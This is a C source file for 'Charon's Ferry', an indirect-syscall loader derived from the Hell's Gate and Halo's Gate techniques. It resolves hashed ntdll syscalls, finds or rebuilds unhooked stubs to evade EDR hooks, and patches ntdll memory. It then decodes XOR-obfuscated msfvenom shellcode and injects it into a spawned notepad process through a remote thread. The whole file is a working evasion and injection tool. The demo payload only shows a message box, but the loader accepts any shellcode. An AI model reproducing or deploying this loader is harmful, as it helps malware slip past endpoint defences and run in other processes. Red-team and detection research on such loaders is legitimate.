/*
 * Charon's Ferry - An indirect syscaller
 *
 * Adapted from https://github.com/am0nsec/HellsGate
 * Based on 1st evolution https://blog.sektor7.net/#!res/2021/halosgate.md
 * and 2nd evolution https://trickster0.github.io/posts/Halo's-Gate-Evolves-to-Tartarus-Gate/
 * and unpublished "Veles Reek" mentioned by @SECTOR7net
 * Indirectly calls syscall
 * For 64-Bit Win 10 and 11
 */

#include <Windows.h>
#include <stdio.h>

#include "charons_ferry.h"

#define STUB_SZ 0x20
#define ASSUME_SYSCALLS 0x1d0
#define SYSCALL0_HASH 0x713e7508211f4d66 // NtAccessCheck

 /*--------------------------------------------------------------------
   VX Tables
 --------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY
{
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
    PVOID   pSyscallAddr; // address of a valid syscall instruction nearby
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

typedef struct _VX_TABLE
{
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
    VX_TABLE_ENTRY NtTestAlert;
} VX_TABLE, *PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
    _In_ PVOID                     pModuleBase,
    _Out_ PIMAGE_EXPORT_DIRECTORY *ppImageExportDirectory
);
BOOL GetVxTableEntry(
    _In_ PVOID pModuleBase,
    _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
    _In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
    _In_ PVX_TABLE pVxTable
);
BOOL GetSyscallAddress(
    _Inout_ PVX_TABLE_ENTRY pVxTableEntry,
    _In_    PVOID pFunctionAddress,
    _In_    SHORT offset
);
VOID UnhookNtdll(
    _In_ PVOID pModuleBase, 
    _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory
);
DWORD CreateNotepad(
    VOID
);

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
VOID HellsGate(WORD wSystemCall);
VOID CharonFerry(PVOID pSyscallAddr);
NTSTATUS HellDescent();

int main(void)
{
#if !(_WIN64)
    return 0x1;
#endif

    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
        return 0x1;

    // Get NTDLL module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // Get the EAT of NTDLL
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x1;

    VX_TABLE Table = { 0 };
    Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
        return 0x1;

    Table.NtWriteVirtualMemory.dwHash = 0x68a3c2ba486f0741;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
        return 0x1;

    Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
        return 0x1;

    Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
        return 0x1;

    Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
        return 0x1;

    Table.NtTestAlert.dwHash = 0x8acce7d8ae36feae;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtTestAlert))
        return 0x1;

    Payload(&Table);
    return 0x0;
}

PTEB RtlGetThreadEnvironmentBlock()
{
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str)
{
    DWORD64 dwHash = 0x7734773477347734;
    INT c;

    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY *ppImageExportDirectory)
{
    // Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    // Get NT headers
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry)
{
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
            pVxTableEntry->pAddress = pFunctionAddress;
            if (!GetSyscallAddress(pVxTableEntry, pFunctionAddress, 0)) {
                // Means function is hooked
                // Check neighbors to find clean functions
                for (SHORT idx = 1; idx <= ASSUME_SYSCALLS; idx++) {
                    // Check upper neighbor
                    if (GetSyscallAddress(pVxTableEntry, (DWORD64)pFunctionAddress + STUB_SZ * idx, -idx))
                        return TRUE;

                    // Check lower neighbor
                    if (GetSyscallAddress(pVxTableEntry, (DWORD64)pFunctionAddress - STUB_SZ * idx, idx))
                        return TRUE;
                }

                // Means all (syscalling) functions are hooked... real stingy EDR there
                // Unhook all functions from the first
                UnhookNtdll(pModuleBase, pImageExportDirectory);

                // Then retrieve syscall again
                if (!GetSyscallAddress(pVxTableEntry, pFunctionAddress, 0))
                    return FALSE;
            }
            return TRUE;
        }
    }

    // If reach here means failed, probably wrong hash
    return FALSE;
}

BOOL GetSyscallAddress(PVX_TABLE_ENTRY pVxTableEntry, PVOID pFunctionAddress, SHORT offset)
{
    // First opcodes should be :
    //    MOV R10, RCX
    //    MOV RCX, <syscall>
    if (*((PBYTE)pFunctionAddress) == 0x4c
        && *((PBYTE)pFunctionAddress + 1) == 0x8b
        && *((PBYTE)pFunctionAddress + 2) == 0xd1
        && *((PBYTE)pFunctionAddress + 3) == 0xb8
        && *((PBYTE)pFunctionAddress + 6) == 0x00
        && *((PBYTE)pFunctionAddress + 7) == 0x00) {
        BYTE high = *((PBYTE)pFunctionAddress + 5);
        BYTE low = *((PBYTE)pFunctionAddress + 4);
        pVxTableEntry->wSystemCall = (high << 8) | low + offset;

        // Resolve address of either :
        //      syscall
        // or :
        //      int 2E
        for (BYTE i = 0; i < STUB_SZ; i++) {
            if ((*(PBYTE)((DWORD64)pFunctionAddress + i) == 0x0f
                && *(PBYTE)((DWORD64)pFunctionAddress + i + 1) == 0x05)
                || (*(PBYTE)((DWORD64)pFunctionAddress + i) == 0xcd
                    && *(PBYTE)((DWORD64)pFunctionAddress + i + 1) == 0x2e)) {
                pVxTableEntry->pSyscallAddr = (PVOID)((DWORD64)pFunctionAddress + (DWORD64)i);
                break;
            }
        }
    }
    if (!pVxTableEntry->pSyscallAddr || !pVxTableEntry->wSystemCall)
        return FALSE;

    return TRUE;
}

VOID UnhookNtdll(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory)
{
    unsigned char patch[] = "\x4c\x8b\xd1\xb8\x54\x00\x00\x00\xf6\x04\x25\x08\x03\xfe\x7f\x01\x75\x03\x0f\x05\xc3\xcd\x2e\xc3\x0f\x1f\x84\x00\x00\x00\x00\x00";
    DWORD written;
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < ASSUME_SYSCALLS; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
        if (djb2(pczFunctionName) == SYSCALL0_HASH) {
            for (WORD i = 0; i < 0x1d0; i++) {
                if (i == 0x5a) // NtQuerySystemTime is weird, only 10 bytes
                    continue;
                *(PDWORD)&(patch[4]) = i;
                WriteProcessMemory((HANDLE)-1, (DWORD64)pFunctionAddress + i * STUB_SZ, patch, STUB_SZ, &written);
            }
            break;
        }
    }
    return;
}

BOOL Payload(PVX_TABLE pVxTable)
{
    NTSTATUS status = 0x00000000;

    // msfvenom --platform windows -p windows/x64/messagebox TEXT="shellcode execution" EXITFUNC=thread -f c
    // xor 0x53
    unsigned char shellcode[327] =
        "\xaf\x1b\xd2\xb7\xa3\xac\xac\xac\xbb\x83\x53\x53\x53\x12\x02\x12\x03\x01\x02\x05\x1b\x62"
        "\x81\x36\x1b\xd8\x01\x33\x6d\x1b\xd8\x01\x4b\x6d\x1b\xd8\x01\x73\x6d\x1b\xd8\x21\x03\x6d"
        "\x1b\x5c\xe4\x19\x19\x1e\x62\x9a\x1b\x62\x93\xff\x6f\x32\x2f\x51\x7f\x73\x12\x92\x9a\x5e"
        "\x12\x52\x92\xb1\xbe\x01\x12\x02\x6d\x1b\xd8\x01\x73\x6d\xd8\x11\x6f\x1b\x52\x83\x6d\xd8"
        "\xd3\xdb\x53\x53\x53\x1b\xd6\x93\x27\x3c\x1b\x52\x83\x03\x6d\xd8\x1b\x4b\x6d\x17\xd8\x13"
        "\x73\x1a\x52\x83\xb0\x0f\x1b\xac\x9a\x6d\x12\xd8\x67\xdb\x1b\x52\x85\x1e\x62\x9a\x1b\x62"
        "\x93\xff\x12\x92\x9a\x5e\x12\x52\x92\x6b\xb3\x26\xa2\x6d\x1f\x50\x1f\x77\x5b\x16\x6a\x82"
        "\x26\x85\x0b\x6d\x17\xd8\x13\x77\x1a\x52\x83\x35\x6d\x12\xd8\x5f\x1b\x6d\x17\xd8\x13\x4f"
        "\x1a\x52\x83\x6d\x12\xd8\x57\xdb\x1b\x52\x83\x12\x0b\x12\x0b\x0d\x0a\x09\x12\x0b\x12\x0a"
        "\x12\x09\x1b\xd0\xbf\x73\x12\x01\xac\xb3\x0b\x12\x0a\x09\x6d\x1b\xd8\x41\xba\x1a\xac\xac"
        "\xac\x0e\x1a\x94\x92\x53\x53\x53\x53\x6d\x1b\xde\xc6\x49\x52\x53\x53\x6d\x1f\xde\xd6\x7d"
        "\x52\x53\x53\x1b\x62\x9a\x12\xe9\x16\xd0\x05\x54\xac\x86\xe8\xb3\x4e\x79\x59\x12\xe9\xf5"
        "\xc6\xee\xce\xac\x86\x1b\xd0\x97\x7b\x6f\x55\x2f\x59\xd3\xa8\xb3\x26\x56\xe8\x14\x40\x21"
        "\x3c\x39\x53\x0a\x12\xda\x89\xac\x86\x20\x3b\x36\x3f\x3f\x30\x3c\x37\x36\x73\x36\x2b\x36"
        "\x30\x26\x27\x3a\x3c\x3d\x53\x1e\x36\x20\x20\x32\x34\x36\x11\x3c\x2b\x53";

    HANDLE x = OpenProcess(PROCESS_ALL_ACCESS, FALSE, CreateNotepad());

    // Allocate memory for the shellcode
    PVOID lpAddress = NULL;
    SIZE_T sDataSize = sizeof(shellcode);

    HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
    CharonFerry(pVxTable->NtTestAlert.pSyscallAddr);
    status = HellDescent(x, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

    sDataSize = sizeof(shellcode);

    for (int i = 0; i < 327; i++)
        shellcode[i] = shellcode[i] ^ 0x53;

    // Write Memory
    DWORD out;
    HellsGate(pVxTable->NtWriteVirtualMemory.wSystemCall);
    CharonFerry(pVxTable->NtTestAlert.pSyscallAddr);
    status = HellDescent(x, lpAddress, shellcode, sDataSize, &out);

    // Change page permissions
    ULONG ulOldProtect = 0;
    HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
    CharonFerry(pVxTable->NtTestAlert.pSyscallAddr);
    status = HellDescent(x, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

    // Create thread
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
    CharonFerry(pVxTable->NtTestAlert.pSyscallAddr);
    status = HellDescent(&hHostThread, 0x1FFFFF, NULL, x, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

    // Wait for 1 seconds
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
    HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
    CharonFerry(pVxTable->NtTestAlert.pSyscallAddr);
    status = HellDescent(hHostThread, FALSE, &Timeout);

    return TRUE;
}

DWORD CreateNotepad(void)
{
    char                    cmdl[] = "C:\\Windows\\System32\\notepad.exe";
    STARTUPINFOA            si = { 0 };
    PROCESS_INFORMATION     pi = { 0 };
    BOOL                    res;

    si.cb = sizeof(STARTUPINFOA);

    res = CreateProcessA(
        cmdl, NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL,
        &si, &pi
    );

    if (!res) {
        puts("[-] Create notepad fail.");
        return 0;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(2000);

    return pi.dwProcessId;
}
